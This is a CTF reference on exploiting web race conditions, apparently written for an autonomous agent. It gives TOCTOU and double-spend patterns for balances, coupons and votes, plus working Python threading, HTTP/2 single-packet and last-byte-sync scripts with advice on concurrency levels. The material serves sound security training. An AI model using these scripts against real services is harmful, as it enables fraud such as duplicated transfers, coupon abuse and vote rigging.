# Web Race Conditions - CTF Reference

> **Document Purpose:** Actionable race condition exploitation techniques for CTF challenges. Covers TOCTOU vulnerabilities, concurrent request strategies, and common double-spend patterns for autonomous agent retrieval.

---

## 1. TOCTOU (Time-of-Check to Time-of-Use)

> **When to use this section:** The application checks a condition and then acts on it in separate steps, creating a window for exploitation.

**Tags:** `race-condition, toctou, time-of-check, time-of-use, concurrent`

**TOCTOU Pattern:**
```
Thread A: CHECK balance >= $100   (balance = $150)
Thread B: CHECK balance >= $100   (balance = $150, still passes)
Thread A: DEDUCT $100             (balance = $50)
Thread B: DEDUCT $100             (balance = -$50, double spend!)
```

**Common TOCTOU Targets:**
- Balance/credit checks before deduction
- Coupon/discount code validation before redemption
- Vote counting (check if voted, then record vote)
- File existence check then file operation
- Permission check then privileged action

---

## 2. Double-Spend / Double-Action Attacks

> **When to use this section:** You want to use a resource (money, coupon, vote) more than once.

**Tags:** `race-condition, double-spend, double-action, parallel-requests`

**Balance Transfer Double-Spend:**
```
1. Account A has $100
2. Send 20 simultaneous requests: "Transfer $100 from A to B"
3. If race condition exists, multiple transfers succeed
4. Account B receives $200+ while A goes negative or stays at $0
```

**Coupon Redemption:**
```
1. Single-use coupon code: DISCOUNT50
2. Send 20 simultaneous POST requests to /redeem with code=DISCOUNT50
3. Multiple redemptions may succeed before the "used" flag is set
```

**Vote Manipulation:**
```
1. One vote per user enforced by check-then-insert
2. Send 50 simultaneous vote requests
3. Multiple votes registered before duplicate check triggers
```

---

## 3. Concurrent Request Techniques

> **When to use this section:** You need to send multiple requests simultaneously to trigger a race condition.

### 3.1 Threading (Python)

**Tags:** `race-condition, threading, python, concurrent, exploitation`

```python
import threading
import requests

url = "http://target.com/transfer"
data = {"amount": 100, "to": "attacker"}
cookies = {"session": "YOUR_SESSION_TOKEN"}

def send_request():
    requests.post(url, data=data, cookies=cookies)

threads = []
for i in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)

# Start all threads as close together as possible
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### 3.2 Single-Packet Attack (HTTP/2)

**Tags:** `race-condition, http2, single-packet, timing`

**Concept:** HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, ensuring they arrive at the server simultaneously with no network jitter.

**Using turbo-intruder (Burp Suite):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req)
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Last-Byte Synchronization (HTTP/1.1)

**Tags:** `race-condition, last-byte-sync, http1, timing`

**Concept:** Send all requests except the last byte, then send all final bytes simultaneously.

**Steps:**
1. Open N TCP connections to the server
2. Send complete HTTP request minus the last byte on each connection
3. Simultaneously send the last byte on all connections
4. Server processes all requests at nearly the same instant

```python
import socket

sockets = []
for i in range(20):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("target.com", 80))
    # Send all but last byte
    request = b"POST /transfer HTTP/1.1\r\nHost: target.com\r\nContent-Length: 10\r\n\r\namount=10"
    s.send(request[:-1])
    sockets.append(s)

# Send final byte on all sockets simultaneously
for s in sockets:
    s.send(request[-1:])
```

---

## 4. Common Vulnerable Patterns

> **When to use this section:** Identifying which application behaviors are susceptible to race conditions.

**Tags:** `race-condition, patterns, vulnerable, detection`

**Pattern 1: Balance Transfers**
```
if user.balance >= amount:    # CHECK
    user.balance -= amount    # USE (gap between check and use)
    target.balance += amount
```

**Pattern 2: Coupon/Code Redemption**
```
if coupon.is_valid and not coupon.used:  # CHECK
    apply_discount(coupon)                # USE
    coupon.used = True                    # UPDATE (too late)
```

**Pattern 3: File Upload + Check**
```
save_file(uploaded_file)         # SAVE
if not is_safe(uploaded_file):   # CHECK (file already saved and accessible)
    delete_file(uploaded_file)   # DELETE (race window: access between save and delete)
```

**Pattern 4: Session Handling**
```
session = get_session(session_id)  # READ
session['cart_total'] -= discount  # MODIFY
save_session(session)              # WRITE (concurrent requests read stale session)
```

---

## 5. Race Condition in Session Handling

> **When to use this section:** Application uses server-side sessions and concurrent requests may read stale session state.

**Tags:** `race-condition, session, concurrent, stale-state`

**PHP Session Locking:**
- PHP locks session file during request processing by default
- This prevents race conditions on session data
- **Bypass:** If `session_write_close()` is called early, the lock is released mid-request

**Detection:**
```
1. Send two requests simultaneously that modify session data
2. If both succeed with the original value, session locking is absent
3. If one blocks until the other completes, session locking is present
```

**Framework-Specific Behavior:**
- **PHP:** Session file locked (safe unless `session_write_close()`)
- **Flask:** No session locking (client-side cookies, inherently racy if using server-side sessions)
- **Express.js:** No default session locking
- **Django:** Database-backed sessions may have row-level locking

---

## 6. Detection Methodology

> **When to use this section:** Systematically testing for race conditions in a target application.

**Tags:** `race-condition, detection, methodology, testing`

**Step 1: Identify State-Changing Endpoints**
```
- POST requests that modify balances, counts, or status
- PUT/PATCH requests that update resources
- Any endpoint with "transfer", "redeem", "vote", "purchase"
```

**Step 2: Send N Identical Requests Simultaneously**
```
- Start with N=10, increase to 20-50 if needed
- Use threading, HTTP/2 single-packet, or last-byte sync
- All requests must use the same session/authentication
```

**Step 3: Analyze Results**
```
- Count successful responses (200 OK)
- Check final state: was the action performed multiple times?
- Look for inconsistent state (negative balances, duplicate entries)
- Compare expected vs actual outcomes
```

**Step 4: Confirm Exploitation**
```
- Repeat 3-5 times to confirm consistency
- Vary concurrency level (10, 20, 50)
- Some race windows are very narrow; may need many attempts
```

---

## 7. CTF Race Condition Playbook

> **When to use this section:** Solving race condition challenges in CTF competitions.

**Tags:** `race-condition, ctf, playbook, patterns, workflow`

**Recognition Signals:**
- Challenge mentions "concurrent", "simultaneous", "timing"
- Application has balance/credit system
- Single-use codes or limited resources
- Descriptions hint at "fast enough" or "at the same time"

**Exploitation Steps:**
1. Identify the state-changing endpoint
2. Determine what condition is checked before the action
3. Send 10-20 simultaneous requests to exploit the check-use gap
4. Verify the action occurred more times than intended
5. Use gained resources (extra money, extra votes) to obtain the flag

**Common Flag Locations After Race Win:**
- Purchase an item you couldn't previously afford
- Unlock a feature requiring N votes/points
- Access admin functionality after role escalation

---

## 8. Agent Takeaway

> - Use `race_condition` tool with `concurrency=10-20` for most challenges
> - Start by identifying endpoints that perform check-then-act operations
> - Double-spend on balance transfers is the most common CTF race condition pattern
> - HTTP/2 single-packet attack gives the tightest timing window
> - For HTTP/1.1, last-byte synchronization is the next best approach
> - If initial attempts fail, increase concurrency (up to 50) and retry multiple times
> - PHP session locking can prevent races; look for `session_write_close()` calls that release locks early
> - Always verify exploitation by checking final application state, not just response codes
